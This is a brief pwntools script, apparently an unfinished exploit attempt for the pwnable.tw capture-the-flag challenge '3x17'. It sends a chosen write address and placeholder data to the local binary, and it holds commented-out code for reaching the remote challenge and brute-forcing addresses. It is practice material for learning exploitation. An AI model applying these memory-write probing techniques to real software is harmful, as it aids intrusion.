#! /usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux', 'splitw', '-h']
context(log_level="error")
#p = remote("chall.pwnable.tw", 10105)
elf = ELF("./3x17")

p = process("./3x17")
if "-d" in sys.argv:
    gdb.attach(p,'b *0x401b75')


start_addr = 0x4b40c0

print(p.recvuntil(b"addr"))
p.send(str(start_addr))
print(p.recvuntil(b"data:"))
p.send("12345678")


'''
for i in range(10000):
    p = process("./3x17")
    p.recvuntil(b"addr:")
    p.send(str(start_addr))
    p.recvuntil(b"data:")
    p.send(str(111111))
    start_addr += 0x4
    p.close()
'''
